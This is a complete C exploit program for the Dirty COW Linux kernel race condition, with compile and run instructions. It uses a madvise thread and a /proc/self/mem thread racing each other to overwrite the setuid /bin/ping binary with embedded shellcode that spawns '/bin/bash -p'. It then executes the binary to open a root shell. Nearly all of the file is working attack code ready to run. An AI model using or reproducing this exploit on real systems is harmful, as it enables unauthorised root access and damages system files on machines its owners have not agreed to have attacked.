/*
####################### exploit_rr1192.c #######################
# gcc -pthread exploit_rr1192.c -o exploit_rr1192
# ./exploit_rr1192
####################### exploit_rr1192.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

void *map;
int f;
struct stat st;
char *name;
unsigned char shellcode[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x84, 0x00, 0x00, 0x00,
  0xb4, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x6a, 0x0b, 0x58, 0x99, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68,
  0x2f, 0x73, 0x68, 0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52,
  0xe8, 0x0d, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61,
  0x73, 0x68, 0x20, 0x2d, 0x70, 0x00, 0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80
};
unsigned int shellcode_len = 132;
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}

void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,shellcode,shellcode_len);
  }
  printf("procselfmem %d\n\n", c);
}

int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  char target_sbin[] = "/bin/ping";
  char shelly[] = "argue";
  pthread_t pth1,pth2;

  printf("[+] Beginning exploit, please wait...\n");
  fflush(stdout);

  f=open(target_sbin,O_RDONLY);
  fstat(f,&st);
  name=target_sbin;

  unsigned char buffer_compare[132];
  size_t sizein;

  while (1) { // VERIFY
    printf("[+] Checking if already overwritten successfully...\n");
    fflush(stdout);
    lseek(f, 0, SEEK_SET);
    sizein = read(f, buffer_compare, shellcode_len);
    if (!memcmp(buffer_compare, shellcode, shellcode_len)) {
      printf("[!] Success !\n");
      fflush(stdout);
      break;
    }
    //lseek(f, 0, SEEK_SET);
    printf("[!] Not yet complete, overwriting...\n");
    fflush(stdout);

    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    //printf("mmap %zx\n\n",(uintptr_t) map);

    pthread_create(&pth1,NULL,madviseThread, target_sbin);
    pthread_create(&pth2,NULL,procselfmemThread, shellcode);

    sleep(5);

    pthread_cancel(pth1);
    pthread_cancel(pth2);
  }

  printf("[+] Trying to launch root shell...\n");
  execl(target_sbin, target_sbin, (char *)NULL);

  // If execl() fails
  perror("[!] Exploit failed !\n");
  return 1;

  //pthread_join(pth1,NULL);
  //pthread_join(pth2,NULL);

  return 0;
}
